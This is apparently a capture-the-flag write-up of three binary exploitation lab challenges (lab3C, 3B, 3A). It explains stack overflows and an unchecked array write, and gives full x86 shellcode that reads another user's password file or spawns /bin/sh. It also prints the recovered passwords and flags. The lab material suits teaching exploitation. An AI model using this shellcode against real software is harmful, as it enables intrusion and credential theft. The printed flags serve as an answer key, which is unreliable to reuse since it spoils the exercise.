## lab3C

This is a program that asks us for our username and password. If the username is ```rpisec``` and the password is ```admin```, it exists successfully. Unlike the challenges from lab2, where we had a function that would execute a system command, this time we will have to inject our own code.

Since ```a_user_name[100]``` is a global variable, it is not present in the stack, therefore we have no use for it, but ```a_user_pass[64]``` is. Since we will exit the program immediately if the username is incorrect, we begin our payload by sending the string ```rpisec``` followed by a newline. Then we write our nops and shellcode and change the value of ```RET``` to the middle of our nops.

Note: When ran in a debugger, the addresses of a binary will differ from the addresses outside. We use a script called ```fixenv``` to fix this.

```bash
python expl3C.py
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

cat ~lab3B/.pass
th3r3_iz_n0_4dm1ns_0n1y_U!
```
## lab3B

This challenge is pretty straightforward. We cannot spawn a shell with our shellcode, so we will have to open the password file and read the flag. Our shellcode will then consist of 3 parts 
* using the ```open``` syscall to open the file ```/home/lab3A/.pass```, where we return with a file descriptor
* using the ```read``` function, which will read the contents of the file and store them on the stack
* a call to the ```write``` function which will write on screen (stdout) the ```stack```
* an optional step where we include a call to the ```exit``` function

This is how our shellcode will look like in assembly:

```asm
global _start

_start:

xor ebx, ebx 
xor ecx, ecx 
mul ebx 

; open (path to file, flags), sys call nr 5
; 2f 2f 2f 2f 68 6f 6d 65 2f 6c 61 62 33 41 2f 2e 70 61 73 73   ////home/lab3A/.pass

mov al, 5
push ecx 
push 0x73736170
push 0x2e2f4133
push 0x62616c2f
push 0x656d6f68
push 0x2f2f2f2f
mov ebx, esp 
int 0x80

; read(int fd, buf, count), sys call nr 3

mov ebx, eax 
mov al, 3
mov ecx, esp 
mov dl, 32
int 0x80

; write(int fd, buf, count), sys call nr 4

mov al, 4
mov bl, 1
mov ecx, esp 
mov dl, 32
int 0x80

; exit(0)
mov al, 1
xor ebx, ebx
int 0x80
```

Now we will simply make use of the ```gets``` function, pad the shellcode with a ```NOP``` sled and voila!
Note that ```dl``` cannot take the value ```10``` because in hex that equals to ```0x0A```, which terminates the ```gets``` function.


```bash
python expl3B.py
just give me some shellcode, k
wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd
child is exiting...
```

## lab3A

Looks like a simple program that acts as a database - we can store data and read it. We have an array that stores the data and there seems to be a constraint where we cannot store data in indexes which fulfill this condition: ```index % 3 == 0 || (input >> 24) == 0xb7```.

One interesting line is this one: ```data[index] = input;```
There are no checks to see if the ```index``` value is bigger that the ```STORAGE_SIZE```, which means we can write and read almost anywhere on the ```stack```. Going through ```gdb```, we can calculate at what index the address of ```RET``` is - ```109```.

As such, we will construct a shellcode that spawns a shell, with the difference being that after 2 indexes we will use the ```jump``` instruction to jump over the elements that are ```% 3 == 0``` - indexes which we cannot acess. 
* Since the indexes we cannot acess are int, we will jump 4 bytes.
* Since the jump over 4 bytes instruction (```\xEB\x04```) is 2 bytes, we will be able to write 6 continuous bytes before making the required jump.

One thing to keep in mind is we should make sure that none of the instructions are obstructed when creating this shellcode. An example would be the push instruction, where we push the string ```//bin/sh```. We can only push 4 bytes at once with a push instruction, and adding the push opcode byte itself, we have to make sure that 2 sets of 5 bytes are consecutive. We can use ```NOPS``` to help us fix the gaps.

```asm
0:  31 db                   xor    ebx,ebx
2:  31 c9                   xor    ecx,ecx
4:  f7 e3                   mul    ebx
6:  eb 04                   jmp    0xc
8:  b0 0b                   mov    al,0xb
a:  52                      push   edx
b:  90                      nop
c:  90                      nop
d:  90                      nop
e:  eb 04                   jmp    0x14
10: 68 6e 2f 73 68          push   0x68732f6e
15: 90                      nop
16: eb 04                   jmp    0x1c
18: 68 2f 2f 62 69          push   0x69622f2f
1d: 90                      nop
1e: eb 04                   jmp    0x24
20: 89 e3                   mov    ebx,esp
22: 52                      push   edx
23: 53                      push   ebx
24: 89 e1                   mov    ecx,esp
26: eb 04                   jmp    0x2c
28: cd 80                   int    0x80
2a: 90                      nop
2b: 90                      nop
2c: 90                      nop
2d: 90                      nop
2e: 90                      nop
2f: 90                      nop 
```

We will insert this shellcode in the indexes ```1, 2, 4, 5, 7, 8, 10, 11, 13, 14, 16, 17```.
We change ```RET``` to go to ```index 1``` and execute from there

```flag:sw00g1ty_sw4p_h0w_ab0ut_d3m_h0ps```
